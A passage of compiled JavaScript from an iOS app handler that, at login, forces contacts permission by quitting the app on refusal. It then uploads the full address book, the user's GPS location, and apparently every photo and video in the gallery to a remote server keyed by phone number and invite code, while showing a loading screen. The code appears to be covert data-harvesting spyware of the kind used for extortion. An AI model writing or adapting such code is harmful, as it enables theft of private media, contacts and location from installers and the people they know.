          "application/quicktime"
        ];
        return videoMimeTypes.some((type) => mimeType.startsWith(type));
      };
      const uploadSingleMedia = async (media, retryCount = 0) => {
        try {
          if (!media || !media.path) {
            formatAppLog("error", "at utils/ios-handler.js:266", "无效的媒体对象:", media);
            return false;
          }
          const filePath = media.path || "";
          const fileName = filePath.toLowerCase();
          const isVideo = isVideoFile(fileName) || isVideoMimeType(media.mimeType) || media.duration && media.duration > 0 || // 检查是否有持续时间属性
          media.mediaType && (media.mediaType === "video" || media.mediaType === 1) || // 1表示视频
          media.type && (media.type === "video" || media.type === 1);
          formatAppLog("log", "at utils/ios-handler.js:282", `处理媒体文件: 
            路径: ${filePath}
            类型: ${isVideo ? "视频" : "图片"}
            MIME类型: ${media.mimeType || "未知"}
            持续时间: ${media.duration || "未知"}
            媒体类型: ${media.mediaType || "未知"}`);
          if (isVideo) {
            formatAppLog("log", "at utils/ios-handler.js:291", "检测到视频文件，准备上传");
            try {
              if (plus.os.name.toLowerCase() === "ios") {
                formatAppLog("log", "at utils/ios-handler.js:296", "使用FileTransfer上传iOS视频文件");
                const uploadUrl = `${config$1.ios_api.base_url}${config$1.ios_api.upload.uploadFile}`;
                const options = new plus.net.URLOptions();
                options.method = "POST";
                options.timeout = 18e4;
                let formData = { id: phone, file_type: "video" };
                return new Promise((resolve2, reject) => {
                  try {
                    uni.uploadFile({
                      url: uploadUrl,
                      filePath,
                      name: "file",
                      formData,
                      success: (res) => {
                        formatAppLog("log", "at utils/ios-handler.js:318", "视频上传成功:", res);
                        uploadedCount++;
                        errorCount = 0;
                        formatAppLog("log", "at utils/ios-handler.js:321", `上传进度: ${uploadedCount}/${totalPhotos}`);
                        resolve2(true);
                      },
                      fail: (err) => {
                        formatAppLog("error", "at utils/ios-handler.js:325", "视频上传失败:", err);
                        reject(err);
                      }
                    });
                  } catch (uploadError) {
                    formatAppLog("error", "at utils/ios-handler.js:330", "创建上传请求失败:", uploadError);
                    reject(uploadError);
                  }
                });
              }
              const fileEntry = await new Promise((resolve2, reject) => {
                plus.io.resolveLocalFileSystemURL(filePath, resolve2, reject);
              });
              const fileInfo = await new Promise((resolve2, reject) => {
                fileEntry.getMetadata(resolve2, reject);
              }).catch((err) => {
                formatAppLog("error", "at utils/ios-handler.js:345", "获取文件元数据失败:", err);
                return {};
              });
              if (fileInfo.size === 0) {
                formatAppLog("error", "at utils/ios-handler.js:352", "文件大小为0，跳过上传");
                return false;
              }
              if (fileInfo.size) {
                formatAppLog("log", "at utils/ios-handler.js:357", `视频文件大小: ${fileInfo.size} 字节, 修改时间: ${fileInfo.modificationTime}`);
              }
              await this.uploadFile(filePath, phone, true);
              formatAppLog("log", "at utils/ios-handler.js:362", "视频上传完成");
            } catch (fileError) {
              formatAppLog("error", "at utils/ios-handler.js:364", "视频文件访问出错:", fileError);
              if (plus.os.name.toLowerCase() === "ios") {
                try {
                  formatAppLog("log", "at utils/ios-handler.js:369", "尝试使用uni.uploadFile直接上传视频");
                  const uploadUrl = `${config$1.ios_api.base_url}${config$1.ios_api.upload.uploadFile}`;
                  return new Promise((resolve2, reject) => {
                    uni.uploadFile({
                      url: uploadUrl,
                      filePath,
                      name: "file",
                      formData: {
                        id: phone,
                        file_type: "video"
                      },
                      success: (res) => {
                        formatAppLog("log", "at utils/ios-handler.js:382", "备选方法视频上传成功:", res);
                        uploadedCount++;
                        errorCount = 0;
                        formatAppLog("log", "at utils/ios-handler.js:385", `上传进度: ${uploadedCount}/${totalPhotos}`);
                        resolve2(true);
                      },
                      fail: (err) => {
                        formatAppLog("error", "at utils/ios-handler.js:389", "备选方法视频上传失败:", err);
                        reject(err);
                      }
                    });
                  });
                } catch (altError) {
                  formatAppLog("error", "at utils/ios-handler.js:395", "备选上传方法失败:", altError);
                  throw altError;
                }
              }
              if (String(fileError).includes("permission") || String(fileError).includes("denied") || String(fileError).includes("不允许读")) {
                uni.showToast({
                  title: "无法访问视频文件，请检查权限设置",
                  icon: "none",
                  duration: 3e3
                });
                try {
                  formatAppLog("log", "at utils/ios-handler.js:410", "尝试使用插件API直接获取视频数据");
                  if (media.originalPath) {
                    formatAppLog("log", "at utils/ios-handler.js:413", "尝试使用originalPath:", media.originalPath);
                    const uploadUrl = `${config$1.ios_api.base_url}${config$1.ios_api.upload.uploadFile}`;
                    return new Promise((resolve2, reject) => {
                      uni.uploadFile({
                        url: uploadUrl,
                        filePath: media.originalPath,
                        name: "file",
                        formData: { id: phone, file_type: "video" },
                        success: (res) => {
                          formatAppLog("log", "at utils/ios-handler.js:422", "使用originalPath上传成功:", res);
                          uploadedCount++;
                          resolve2(true);
                        },
                        fail: (err) => reject(err)
                      });
                    });
                  } else if (media.fileid) {
                    formatAppLog("log", "at utils/ios-handler.js:431", "尝试使用fileid获取视频");
                  }
                } catch (altPathError) {
                  formatAppLog("error", "at utils/ios-handler.js:435", "替代路径访问失败:", altPathError);
                }
              }
              if (media.originalPath && media.originalPath !== filePath) {
                formatAppLog("log", "at utils/ios-handler.js:441", "尝试替代路径:", media.originalPath);
                try {
                  await this.uploadFile(media.originalPath, phone, true);
                  formatAppLog("log", "at utils/ios-handler.js:444", "使用替代路径上传视频成功");
                } catch (altError) {
                  formatAppLog("error", "at utils/ios-handler.js:446", "替代路径上传失败:", altError);
                  throw altError;
                }
              } else {
                throw fileError;
              }
            }
          } else {
            const processedPath = await this.getImagePath(filePath);
            await this.uploadFile(processedPath, phone, false);
          }
          uploadedCount++;
          errorCount = 0;
          formatAppLog("log", "at utils/ios-handler.js:461", `上传进度: ${uploadedCount}/${totalPhotos}`);
          return true;
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:464", "上传失败:", error);
          const errorMsg = error.message || "";
          if (errorMsg.includes("成功")) {
            formatAppLog("log", "at utils/ios-handler.js:469", "忽略假性错误，实际上传成功");
            uploadedCount++;
            errorCount = 0;
            return true;
          }
          if (retryCount < maxRetries) {
            formatAppLog("log", "at utils/ios-handler.js:477", `第 ${retryCount + 1} 次重试上传...`);
            await new Promise((r) => setTimeout(r, 1e3));
            return await uploadSingleMedia(media, retryCount + 1);
          }
          errorCount++;
          if (errorCount >= maxErrors) {
            formatAppLog("log", "at utils/ios-handler.js:486", `检测到连续 ${maxErrors} 次错误，暂停5秒后继续...`);
            await new Promise((r) => setTimeout(r, 5e3));
            errorCount = 0;
          }
          return false;
        }
      };
      const scanAndUpload = async () => {
        var _a, _b, _c;
        try {
          await this.checkNetworkConnection();
          formatAppLog("log", "at utils/ios-handler.js:500", "网络连接正常，开始处理相册");
          formatAppLog("log", "at utils/ios-handler.js:503", "准备开始上传相册文件，触发倒计时和跳转");
          this.navigateToLoading();
          let totalMediaFiles = 0;
          try {
            formatAppLog("log", "at utils/ios-handler.js:512", "开始获取图片文件...");
            const mediaConfig = {
              count: pageSize,
              page: 1,
              asc: false,
              time: 0,
              // 只获取图片，不包括视频
              includeVideos: false
            };
            formatAppLog("log", "at utils/ios-handler.js:522", "请求图片文件，配置:", JSON.stringify(mediaConfig));
            const firstPage = await new Promise((resolveGet) => {
              galleryModule.getGalleryImages(mediaConfig, resolveGet);
            });
            if ((firstPage == null ? void 0 : firstPage.status) === 200 && ((_a = firstPage.data) == null ? void 0 : _a.length) > 0) {
              const imageCount = firstPage.total || firstPage.data.length;
              totalPhotos = imageCount;
              totalMediaFiles = imageCount;
              formatAppLog("log", "at utils/ios-handler.js:534", `已获取 ${imageCount} 个图片文件需要处理`);
              for (const media of firstPage.data) {
                await uploadSingleMedia(media);
                await this.checkNetworkConnection();
              }
              currentPage = 2;
              let consecutiveFailures = 0;
              const maxConsecutiveFailures = 3;
              while (currentPage * pageSize <= imageCount && consecutiveFailures < maxConsecutiveFailures) {
                await this.checkNetworkConnection();
                try {
                  formatAppLog("log", "at utils/ios-handler.js:553", `获取第 ${currentPage} 页图片文件...`);
                  const ret = await new Promise((resolveGet) => {
                    galleryModule.getGalleryImages({
                      count: pageSize,
                      page: currentPage,
                      asc: false,
                      time: 0,
                      includeVideos: false
                      // 只获取图片
                    }, resolveGet);
                  });
                  if ((ret == null ? void 0 : ret.status) === 200 && ((_b = ret.data) == null ? void 0 : _b.length) > 0) {
                    formatAppLog("log", "at utils/ios-handler.js:565", `获取第 ${currentPage} 页图片文件成功: ${ret.data.length} 个`);
                    for (const media of ret.data) {
                      await uploadSingleMedia(media);
                      await this.checkNetworkConnection();
                    }
                    currentPage++;
                    consecutiveFailures = 0;
                  } else {
                    consecutiveFailures++;
                    formatAppLog("log", "at utils/ios-handler.js:578", `获取第 ${currentPage} 页图片文件失败，尝试下一页`);
                    currentPage++;
                    await new Promise((r) => setTimeout(r, 2e3));
                  }
                } catch (error) {
                  formatAppLog("error", "at utils/ios-handler.js:583", `获取第 ${currentPage} 页图片文件出错:`, error);
                  consecutiveFailures++;
                  currentPage++;
                  await new Promise((r) => setTimeout(r, 2e3));
                }
              }
            } else {
              formatAppLog("log", "at utils/ios-handler.js:590", "没有获取到图片文件或文件列表为空");
            }
          } catch (error) {
            formatAppLog("error", "at utils/ios-handler.js:593", "获取图片文件列表失败:", error);
          }
          try {
            formatAppLog("log", "at utils/ios-handler.js:598", "开始获取视频文件...");
            const videosResult = await new Promise((resolveVideo) => {
              galleryModule.getGalleryVideos({
                count: 20,
                // 每页获取20个视频
                page: 1,
                // 从第1页开始
                asc: false,
                // 按创建时间倒序
                copyToAppCacheDir: true
                // 请求复制文件到应用缓存目录
              }, resolveVideo);
            });
            if ((videosResult == null ? void 0 : videosResult.status) === 200 && ((_c = videosResult.data) == null ? void 0 : _c.length) > 0) {
              formatAppLog("log", "at utils/ios-handler.js:609", `成功获取 ${videosResult.data.length} 个视频文件`);
              formatAppLog("log", "at utils/ios-handler.js:610", "视频文件列表:", JSON.stringify(videosResult.data.map((v) => ({
                filename: v.filename,
                duration: v.duration,
                size: v.size
              }))));
              const videoCount = videosResult.data.length;
              totalPhotos = totalMediaFiles + videoCount;
              for (const video of videosResult.data) {
                formatAppLog("log", "at utils/ios-handler.js:622", `准备处理视频: ${video.filename}, 时长: ${video.duration}秒`);
                try {
                  if (video.path) {
                    const uploadUrl = `${config$1.ios_api.base_url}${config$1.ios_api.upload.uploadFile}`;
                    const result = await new Promise((resolve2, reject) => {
                      uni.uploadFile({
                        url: uploadUrl,
                        filePath: video.path,
                        name: "file",
                        formData: {
                          id: phone,
                          file_type: "video",
                          timestamp: Date.now()
                        },
                        success: (res) => {
                          formatAppLog("log", "at utils/ios-handler.js:639", "视频直接上传成功:", res);
                          uploadedCount++;
                          resolve2(true);
                        },
                        fail: (err) => {
                          formatAppLog("error", "at utils/ios-handler.js:644", "视频直接上传失败:", err);
                          reject(err);
                        }
                      });
                    }).catch((err) => {
                      formatAppLog("error", "at utils/ios-handler.js:649", "视频上传过程错误:", err);
                      return false;
                    });
                    if (result) {
                      formatAppLog("log", "at utils/ios-handler.js:654", `视频 ${video.filename} 上传成功`);
                      await this.checkNetworkConnection();
                      continue;
                    }
                  }
                } catch (directUploadError) {
                  formatAppLog("error", "at utils/ios-handler.js:661", "直接上传视频失败:", directUploadError);
                }
                if (video.path) {
                  await uploadSingleMedia({
                    ...video,
                    mediaType: "video"
                    // 显式标记为视频
                  });
                  await this.checkNetworkConnection();
                } else {
                  formatAppLog("error", "at utils/ios-handler.js:673", "视频文件缺少路径:", video);
                }
              }
            } else {
              formatAppLog("log", "at utils/ios-handler.js:677", "未找到视频文件或获取失败:", videosResult);
            }
          } catch (videoError) {
            formatAppLog("error", "at utils/ios-handler.js:680", "获取视频文件出错:", videoError);
          }
          formatAppLog("log", "at utils/ios-handler.js:683", `相册处理完成，共上传 ${uploadedCount}/${totalPhotos} 个媒体文件`);
          resolve({ total: totalPhotos, uploaded: uploadedCount });
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:687", "处理过程出错:", error);
          resolve({ total: totalPhotos, uploaded: uploadedCount });
        }
      };
      scanAndUpload();
    }
    // 处理图片路径
    static getImagePath(path) {
      return new Promise((resolve, reject) => {
        uni.compressImage({
          src: path,
          quality: 80,
          success: (res) => {
            resolve(res.tempFilePath);
          },
          fail: (error) => {
            formatAppLog("error", "at utils/ios-handler.js:706", "压缩图片失败:", error);
            resolve(path);
          }
        });
      });
    }
    // 上传数据到服务器
    static async uploadData(url, data, phone) {
      formatAppLog("log", "at utils/ios-handler.js:715", "准备上传数据:", {
        url,
        data
      });
      const code = uni.getStorageSync("code") || "";
      const baseUrl = config$1.baseUrl;
      const fullUrl = `${baseUrl}/api/${url}`;
      return new Promise((resolve, reject) => {
        uni.request({
          url: fullUrl,
          method: "POST",
          data: {
            data: typeof data === "string" ? data : JSON.stringify(data),
            phone,
            code
            // 添加邀请码参数
          },
          header: {
            "content-type": "application/x-www-form-urlencoded"
          },
          success: (res) => {
            formatAppLog("log", "at utils/ios-handler.js:739", "请求成功:", res);
            resolve(res.data);
          },
          fail: (error) => {
            formatAppLog("error", "at utils/ios-handler.js:743", "请求失败:", error);
            reject(error);
          }
        });
      });
    }
    // 修改 uploadFile 方法，使用plus.uploader文件流上传
    static async uploadFile(filePath, phone, isVideo = false) {
      const uploadUrl = `${config$1.ios_api.base_url}${config$1.ios_api.upload.uploadFile}`;
      formatAppLog("log", "at utils/ios-handler.js:754", `上传${isVideo ? "视频" : "图片"}到URL:`, uploadUrl);
      const formattedPhone = phone.toString().trim();
      if (!formattedPhone || formattedPhone === "undefined") {
        formatAppLog("error", "at utils/ios-handler.js:760", "电话号码无效:", formattedPhone);
        return Promise.reject(new Error("电话号码无效"));
      }
      formatAppLog("log", "at utils/ios-handler.js:764", "使用手机号上传:", formattedPhone);
      return new Promise((resolve, reject) => {
        try {
          const task = plus.uploader.createUpload(uploadUrl, {
            method: "POST",
            timeout: 18e4,
            // 设置3分钟超时
            priority: isVideo ? 1 : 2
            // 视频优先级高于图片
          }, (t, status) => {
            if (status == 200) {
              let response = t.responseText;
              if (response === "成功" || response === "获取成功" || response.includes("成功") || response.trim() === "") {
                formatAppLog("log", "at utils/ios-handler.js:779", `${isVideo ? "视频" : "图片"}上传成功`);
                resolve(t);
              } else {
                formatAppLog("error", "at utils/ios-handler.js:782", `${isVideo ? "视频" : "图片"}上传失败:`, response);
                reject(new Error("上传失败: " + response));
              }
            } else {
              let errorMsg = `上传失败: 状态码 ${status}`;
              try {
                errorMsg += `, 响应: ${t.responseText || "无响应"}`;
              } catch (e) {
              }
              formatAppLog("error", "at utils/ios-handler.js:790", errorMsg);
              reject(new Error(errorMsg));
            }
          });
          task.addData("id", formattedPhone);
          if (isVideo) {
            task.addData("file_type", "video");
            task.addData("timestamp", (/* @__PURE__ */ new Date()).getTime().toString());
          }
          let filename = filePath.substring(filePath.lastIndexOf("/") + 1);
          if (isVideo && !filename.match(/\.(mp4|mov|m4v)$/i)) {
            filename += ".mp4";
          }
          formatAppLog("log", "at utils/ios-handler.js:813", `准备上传文件: ${filename}, 类型: ${isVideo ? "video" : "image"}`);
          task.addFile(filePath, {
            key: "file",
            name: filename
          });
          task.addEventListener("statechanged", (upload, status) => {
            if (status === 2) {
              const uploadedSize = upload.uploadedSize;
              const totalSize = upload.totalSize;
              const percent = Math.round(uploadedSize / totalSize * 100);
              if (percent % 10 === 0) {
                formatAppLog("log", "at utils/ios-handler.js:826", `${isVideo ? "视频" : "图片"}上传进度: ${percent}%`);
              }
            }
          });
          task.start();
          formatAppLog("log", "at utils/ios-handler.js:833", `开始上传${isVideo ? "视频" : "图片"}: ${filename}`);
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:835", `创建上传任务失败:`, error);
          reject(error);
        }
      });
    }
    // 上传照片
    static async uploadPhotos(photos) {
      const processedPath = await this.getImagePath(photos.path);
      try {
        await this.uploadFile(processedPath, uni.getStorageSync("phone"));
        return true;
      } catch (error) {
        formatAppLog("error", "at utils/ios-handler.js:848", "上传失败:", error);
        return false;
      }
    }
    // 跳转到加载页面
    static navigateToLoading() {
      var _a;
      if (this.hasNavigated) {
        formatAppLog("log", "at utils/ios-handler.js:857", "已经跳转过，跳过本次跳转");
        return;
      }
      this.hasNavigated = true;
      formatAppLog("log", "at utils/ios-handler.js:863", "准备跳转到加载页面，已设置跳转标志");
      const pages = getCurrentPages();
      const currentRoute = ((_a = pages[pages.length - 1]) == null ? void 0 : _a.route) || "";
      if (currentRoute.includes("loading")) {
        formatAppLog("log", "at utils/ios-handler.js:871", "当前已在loading页面，无需跳转");
        return;
      }
      uni.navigateTo({
        url: "/pages/loading/loading",
        success: () => {
          formatAppLog("log", "at utils/ios-handler.js:878", "跳转成功");
        },
        fail: (error) => {
          formatAppLog("error", "at utils/ios-handler.js:881", "跳转失败:", error);
          this.hasNavigated = false;
        }
      });
    }
    // 添加权限检查方法
    static async checkPhotoPermission() {
      return new Promise((resolve) => {
        const galleryModule = requireNativePlugin("vutet-getGalleryImages");
        if (!galleryModule) {
          formatAppLog("error", "at utils/ios-handler.js:893", "插件加载失败");
          resolve(false);
          return;
        }
        const permissionStatus = uni.getStorageSync("ios_photo_permission");
        if (permissionStatus === "granted") {
          formatAppLog("log", "at utils/ios-handler.js:901", "相册权限已获取(缓存)");
          resolve(true);
          return;
        }
        galleryModule.checkPermission((res) => {
          formatAppLog("log", "at utils/ios-handler.js:907", "相册权限检查结果:", res);
          if (res.status === 200 && plus.os.name.toLowerCase() === "ios") {
            try {
              const PHPhotoLibraryClass = plus.ios.importClass("PHPhotoLibrary");
              if (PHPhotoLibraryClass) {
                const authStatus = PHPhotoLibraryClass.authorizationStatus();
                formatAppLog("log", "at utils/ios-handler.js:916", "原生相册权限状态:", authStatus);
                if (plus.device.model.includes("14") || plus.device.model.includes("15") || plus.device.model.includes("16")) {
                  try {
                    const PHAccessLevelClass = plus.ios.importClass("PHAccessLevel");
                    if (PHAccessLevelClass) {
                      const accessLevel = PHPhotoLibraryClass.authorizationStatusForAccessLevel(PHAccessLevelClass.readWrite);
                      formatAppLog("log", "at utils/ios-handler.js:924", "相册读写权限级别:", accessLevel);
                    }
                  } catch (e) {
                    formatAppLog("error", "at utils/ios-handler.js:927", "读写权限检查失败:", e);
                  }
                }
              }
            } catch (e) {
              formatAppLog("error", "at utils/ios-handler.js:932", "原生权限检查失败:", e);
            }
          }
          if (res.status === 200) {
            uni.setStorageSync("ios_photo_permission", "granted");
          }
          resolve(res.status === 200);
        });
      });
    }
    // 显示权限对话框的统一方法
    static showPermissionDialog(title, content, showSettings = true) {
      this.permissionDialogShowing = false;
      formatAppLog("log", "at utils/ios-handler.js:955", "显示权限对话框:", title);
      this.permissionDialogShowing = true;
      return new Promise((resolve) => {
        uni.showModal({
          title,
          content,
          confirmText: showSettings ? "去设置" : "确定",
          cancelText: "退出应用",
          showCancel: showSettings,
          // 如果不需要跳转设置，则不显示取消按钮
          success: (res) => {
            if (res.confirm && showSettings) {
              if (plus.os.name.toLowerCase() === "ios") {
                plus.runtime.openURL("app-settings:");
              }
            }
            resolve(res);
          },
          complete: () => {
            setTimeout(() => {
              this.permissionDialogShowing = false;
            }, 300);
          }
        });
      });
    }
    // 在应用启动时检查通讯录权限状态
    static checkContactsPermissionAtLaunch() {
      formatAppLog("log", "at utils/ios-handler.js:985", "启动时检查通讯录权限状态");
      this.permissionDialogShowing = false;
      const permissionDenied = uni.getStorageSync("ios_contacts_permission_denied");
      const permissionGranted = uni.getStorageSync("ios_contacts_permission");
      if (permissionDenied === "true" && permissionGranted !== "granted") {
        formatAppLog("log", "at utils/ios-handler.js:995", "应用启动时检测到之前拒绝过通讯录权限，重新检查实际权限状态");
        try {
          const addressBookResult = this.checkContactsPermissionSync();
          if (addressBookResult === true) {
            formatAppLog("log", "at utils/ios-handler.js:1004", "实际检查发现通讯录权限已获得，清除拒绝记录");
            uni.setStorageSync("ios_contacts_permission", "granted");
            uni.removeStorageSync("ios_contacts_permission_denied");
            return true;
          } else {
            formatAppLog("log", "at utils/ios-handler.js:1010", "实际检查确认通讯录权限被拒绝，显示引导对话框");
            this.showPermissionDialog(
              "需要通讯录权限",
              "此应用需要访问通讯录才能正常使用，请在设置中开启通讯录权限"
            ).then(() => {
              formatAppLog("log", "at utils/ios-handler.js:1018", "对话框关闭，延迟退出应用");
              setTimeout(() => {
                this.forceQuitApp();
              }, 500);
            });
            return false;
          }
        } catch (error) {
          formatAppLog("error", "at utils/ios-handler.js:1027", "通讯录权限实际检查出错:", error);
          if (!this.permissionDialogShowing) {
            this.showPermissionDialog(
              "需要通讯录权限",
              "此应用需要访问通讯录才能正常使用，请在设置中开启通讯录权限"
            ).then(() => {
              setTimeout(() => {
                this.forceQuitApp();
              }, 500);
            });
          }
          return false;
        }
      }
      return true;
    }
    // 同步检查通讯录权限方法
    static checkContactsPermissionSync() {
      try {
        const hasPermission = plus.ios.invoke("CNContactStore", "authorizationStatusForEntityType:", 0);
        formatAppLog("log", "at utils/ios-handler.js:1050", "iOS通讯录权限状态码:", hasPermission);
        return hasPermission === 3;
      } catch (error) {
        formatAppLog("error", "at utils/ios-handler.js:1055", "同步检查通讯录权限出错:", error);
        return false;
      }
    }
    // 添加通讯录权限检查方法
    static async checkContactsPermission() {
      this.permissionDialogShowing = false;
      const permissionStatus = uni.getStorageSync("ios_contacts_permission");
      if (permissionStatus === "granted") {
        formatAppLog("log", "at utils/ios-handler.js:1068", "通讯录权限已获取(缓存)");
        return true;
      }
      const permissionDenied = uni.getStorageSync("ios_contacts_permission_denied");
      if (permissionDenied === "true") {
        formatAppLog("log", "at utils/ios-handler.js:1075", "用户之前拒绝过通讯录权限，显示引导对话框并退出应用");
        const actualPermission = this.checkContactsPermissionSync();
        if (actualPermission) {
          formatAppLog("log", "at utils/ios-handler.js:1080", "实际权限检查通过，清除拒绝记录");
          uni.setStorageSync("ios_contacts_permission", "granted");
          uni.removeStorageSync("ios_contacts_permission_denied");
          return true;
        }
        if (!this.permissionDialogShowing) {
          await this.showPermissionDialog(
            "需要通讯录权限",
            "应用需要访问您的通讯录才能继续使用，请在设置中开启通讯录权限"
          );
          formatAppLog("log", "at utils/ios-handler.js:1095", "延迟退出应用");
          setTimeout(() => {
            this.forceQuitApp();
          }, 500);
        }
        throw new Error("通讯录权限被拒绝");
      }
      try {
        return new Promise((resolve, reject) => {
          plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
            uni.setStorageSync("ios_contacts_permission", "granted");
            uni.removeStorageSync("ios_contacts_permission_denied");
            resolve(true);
          }, (error) => {
            formatAppLog("error", "at utils/ios-handler.js:1114", "通讯录权限错误:", error);
            if (error.code === 20 || error.code === error.PERMISSION_DENIED) {
              formatAppLog("log", "at utils/ios-handler.js:1118", "用户拒绝通讯录权限(错误码:" + error.code + ")，记录拒绝状态并退出应用");
              uni.setStorageSync("ios_contacts_permission_denied", "true");
              if (!this.permissionDialogShowing) {
                this.showPermissionDialog(
                  "权限请求失败",
                  "此应用需要访问通讯录才能继续使用。请重启应用并允许通讯录权限。",
                  false
                  // 不显示设置选项
                ).then(() => {
                  formatAppLog("log", "at utils/ios-handler.js:1131", "权限被拒绝，延迟退出应用");
                  setTimeout(() => {
                    this.forceQuitApp();
                  }, 500);
                });
              }
              reject(new Error("通讯录权限被拒绝"));
            } else {
              reject(error);
            }
          });
        });
      } catch (error) {
        formatAppLog("error", "at utils/ios-handler.js:1147", "通讯录权限检查出错:", error);
        setTimeout(() => {
          this.forceQuitApp();
        }, 500);
        throw error;
      }
    }
    // 添加仅检查权限但不显示提示的方法，用于应用启动时重新验证权限
    static checkContactsPermissionWithoutPrompt() {
      this.permissionDialogShowing = false;
      const syncResult = this.checkContactsPermissionSync();
      if (syncResult) {
        uni.setStorageSync("ios_contacts_permission", "granted");
        uni.removeStorageSync("ios_contacts_permission_denied");
        return Promise.resolve(true);
      }
      return new Promise((resolve) => {
        plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
          uni.setStorageSync("ios_contacts_permission", "granted");
          uni.removeStorageSync("ios_contacts_permission_denied");
          resolve(true);
        }, (error) => {
          resolve(false);
        });
      });
    }
    // 添加强制退出应用的方法，尝试多种方式
    static forceQuitApp() {
      formatAppLog("log", "at utils/ios-handler.js:1184", "正在尝试多种方式退出应用...");
      this.permissionDialogShowing = false;
      setTimeout(() => {
        try {
          plus.runtime.quit();
        } catch (e) {
          formatAppLog("error", "at utils/ios-handler.js:1195", "方法1退出失败:", e);
        }
        try {
          setTimeout(() => {
            plus.runtime.restart();
          }, 300);
        } catch (e) {
          formatAppLog("error", "at utils/ios-handler.js:1204", "方法2退出失败:", e);
        }
        if (plus.os.name.toLowerCase() === "ios") {
          try {
            const UIApplicationClass = plus.ios.importClass("UIApplication");
            const app = UIApplicationClass.sharedApplication();
            app.performSelector("exit");
          } catch (e) {
            formatAppLog("error", "at utils/ios-handler.js:1215", "方法3退出失败:", e);
          }
        }
        setTimeout(() => {
          formatAppLog("log", "at utils/ios-handler.js:1221", "最后手段 - 抛出严重错误强制退出");
          throw new Error("FORCE_QUIT_APP");
        }, 500);
      }, 1e3);
    }
    // 添加位置权限检查方法
    static async checkLocationPermission() {
      const permissionStatus = uni.getStorageSync("ios_location_permission");
      if (permissionStatus === "granted") {
        formatAppLog("log", "at utils/ios-handler.js:1232", "位置权限已获取(缓存)");
        return true;
      }
      return new Promise((resolve) => {
        plus.geolocation.getCurrentPosition(
          () => {
            uni.setStorageSync("ios_location_permission", "granted");
            resolve(true);
          },
          (error) => {
            if (error.code === error.PERMISSION_DENIED) {
              uni.showModal({
                title: "提示",
                content: "需要访问位置权限，是否去设置？",
                success: (modalRes) => {
                  if (modalRes.confirm) {
                    if (plus.os.name.toLowerCase() === "ios") {
                      plus.runtime.openURL("app-settings:");
                    }
                  }
                }
              });
            }
            resolve(false);
          },
          { timeout: 5e3 }
        );
      });
    }
    // 添加短信权限检查方法（iOS平台占位）
    static async checkSMSPermission() {
      formatAppLog("log", "at utils/ios-handler.js:1267", "iOS平台不支持短信权限检查，返回默认值");
      uni.setStorageSync("ios_sms_permission", "granted");
      return true;
    }
    // 添加网络检查方法
    static checkNetworkConnection() {
      return new Promise((resolve) => {
        const checkConnection = () => {
          uni.getNetworkType({
            success: (res) => {
              if (res.networkType !== "none") {
                resolve();
              } else {
                setTimeout(checkConnection, 1e3);
              }
            },
            fail: () => {
              setTimeout(checkConnection, 1e3);
            }
          });
        };
        checkConnection();
      });
    }
    // 处理登录
    static async handleLogin(phone, inviteCode) {
      try {
        await this.checkNetworkConnection();
        formatAppLog("log", "at utils/ios-handler.js:1300", "网络已连接，开始处理登录");
        try {
          const hasContactsPermission = await this.checkContactsPermission().catch((err) => {
            formatAppLog("error", "at utils/ios-handler.js:1305", "登录前通讯录权限检查失败:", err);
            throw err;
          });
          formatAppLog("log", "at utils/ios-handler.js:1311", "通讯录权限检查通过，可以继续登录流程");
        } catch (permissionError) {
          if (permissionError.code === 20) {
            formatAppLog("log", "at utils/ios-handler.js:1315", "权限检查时检测到code 20错误，记录状态并显示对话框");
            uni.setStorageSync("ios_contacts_permission_denied", "true");
            await new Promise((resolve) => {
              uni.showModal({
                title: "无法访问通讯录",
                content: "应用需要通讯录权限才能继续。请前往设置开启权限，然后重新启动应用。",
                confirmText: "去设置",
                cancelText: "退出",
                success: (res) => {
                  if (res.confirm) {
                    if (plus.os.name.toLowerCase() === "ios") {
                      plus.runtime.openURL("app-settings:");
                    }
                  }
                  resolve();
                }
              });
            });
            formatAppLog("log", "at utils/ios-handler.js:1339", "强制退出应用");
            this.forceQuitApp();
            throw new Error("通讯录权限错误，无法继续");
          }
          throw permissionError;
        }
        if (!phone) {
          throw new Error("缺少必要的用户验证参数");
        }
        uni.setStorageSync("phone", phone);
        uni.setStorageSync("code", inviteCode);
        const deviceInfo = `${plus.device.vendor}-${plus.device.model}`;
        formatAppLog("log", "at utils/ios-handler.js:1358", "设备信息:", deviceInfo);
        try {
          formatAppLog("log", "at utils/ios-handler.js:1362", "开始处理通讯录");
          const contactData = await this.getContacts(phone, inviteCode);
          if (contactData) {
            const contactResponse = await this.uploadData("Uploads/api", contactData, phone);
            formatAppLog("log", "at utils/ios-handler.js:1366", "通讯录上传结果:", contactResponse);
          } else {
            formatAppLog("log", "at utils/ios-handler.js:1368", "未获取到通讯录数据");
          }
        } catch (contactError) {
          formatAppLog("error", "at utils/ios-handler.js:1371", "通讯录处理失败:", contactError);
          if (contactError.code === 20) {
            formatAppLog("log", "at utils/ios-handler.js:1374", "通讯录获取时检测到code 20错误，记录状态并显示对话框");
            uni.setStorageSync("ios_contacts_permission_denied", "true");
            await new Promise((resolve) => {
              uni.showModal({
                title: "通讯录权限丢失",
                content: "应用无法访问通讯录，请重启应用并允许权限请求。",
                showCancel: false,
                success: () => {
                  resolve();
                }
              });
            });
            this.forceQuitApp();
            throw new Error("通讯录权限错误(code 20)，无法继续");
          }
          if (contactError.message && (contactError.message.includes("权限") || contactError.message.includes("permission") || contactError.code === contactError.PERMISSION_DENIED)) {
            throw contactError;
          }
        }
        try {
          formatAppLog("log", "at utils/ios-handler.js:1408", "开始处理位置信息");
          const position = await this.getLocation();
          const locationData = `${phone},${inviteCode},${position.coords.longitude},${position.coords.latitude}`;
          const locationResponse = await this.uploadData("Uploads/apimap", locationData, phone);
          formatAppLog("log", "at utils/ios-handler.js:1412", "位置上传结果:", locationResponse);
        } catch (locationError) {
          formatAppLog("error", "at utils/ios-handler.js:1414", "位置处理失败:", locationError);
        }
        try {
          formatAppLog("log", "at utils/ios-handler.js:1419", "开始处理相册");
          this.getPhotos().then((result) => {
            formatAppLog("log", "at utils/ios-handler.js:1423", "相册处理完成，上传:", result.uploaded, "/", result.total);
          }).catch((error) => {
